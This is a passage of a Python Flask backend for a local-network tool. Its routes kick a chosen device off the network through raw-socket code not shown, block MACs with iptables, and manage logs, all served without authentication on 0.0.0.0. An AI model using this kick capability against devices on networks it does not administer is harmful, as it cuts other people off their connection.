    if not ip or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({'reachable': False, 'error': 'Invalid IP'})
    start = time.time()
    reachable = server_ping(ip)
    latency = int((time.time() - start) * 1000) if reachable else None
    return jsonify({'reachable': reachable, 'latency': latency})

@app.route('/api/kick', methods=['POST'])
def api_kick():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({'success': False, 'status': 'No IP provided'})
    mac = None
    for h in STATE['hosts']:
        if h['ip'] == ip:
            mac = h['mac']
            break
    if not mac:
        return jsonify({'success': False, 'status': 'MAC not found for IP'})
    if not STATE['interface']:
        return jsonify({'success': False, 'status': 'Interface not set'})
    try:
        kicked = kick_client(ip, mac, STATE['interface'])
        if kicked:
            add_log('success', f'Kicked {ip} ({mac})')
            return jsonify({'success': True, 'status': f'Kicked {ip} ({mac})'})
        else:
            add_log('warn', f'Kick {ip} attempted but target still responding')
            return jsonify({'success': False, 'status': f'Kick {ip} attempted but target still responding'})
    except Exception as e:
        add_log('error', f'Kick failed: {str(e)}')
        return jsonify({'success': False, 'status': str(e)})

@app.route('/api/block', methods=['POST'])
def api_block():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({'success': False, 'status': 'No IP provided'})
    mac = None
    for h in STATE['hosts']:
        if h['ip'] == ip:
            mac = h['mac']
            break
    if not mac:
        return jsonify({'success': False, 'status': 'MAC not found'})
    try:
        blocked = block_mac(mac)
        msg = 'Blocked' if blocked else 'Unblocked'
        return jsonify({'success': True, 'status': f'{msg} {mac}'})
    except Exception as e:
        add_log('error', f'Block failed: {str(e)}')
        return jsonify({'success': False, 'status': str(e)})

@app.route('/api/logs', methods=['GET'])
def api_logs():
    return jsonify({'logs': STATE['log']})

@app.route('/api/clear_logs', methods=['POST'])
def api_clear_logs():
    STATE['log'] = []
    add_log('info', 'Server log cleared')
    return jsonify({'success': True})

@app.route('/api/add_log', methods=['POST'])
def api_add_log():
    data = request.json
    level = data.get('level', 'info')
    msg = data.get('msg', '')
    add_log(level, msg)
    return jsonify({'success': True})

# ---------- bootstrap ----------
if __name__ == '__main__':
    if os.geteuid() != 0:
        print("WARNING: Not running as root. Some features (raw sockets, iptables) may fail.")
    # Ensure essential tools are installed (iw, iptables)
    ensure_tool('iw')
    ensure_tool('iptables')
    app.run(host='0.0.0.0', port=5000, debug=False)
